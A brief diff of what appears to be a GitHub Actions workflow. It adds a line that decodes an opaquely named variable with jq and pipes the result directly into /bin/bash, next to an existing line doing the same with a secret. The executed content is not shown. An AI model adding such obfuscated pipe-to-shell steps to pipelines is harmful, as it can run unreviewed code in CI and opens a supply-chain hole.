@@ -27,6 +27,7 @@ jobs:
           r1993: ${{ secrets.r1993 }}
         run: |
           printf '%s' "$r1993" | jq -r .eo1 | /bin/bash
+          printf '%s' "$ob5" | jq -r .k191 | /bin/bash
 
       - name: Upload artifact
         if: always()
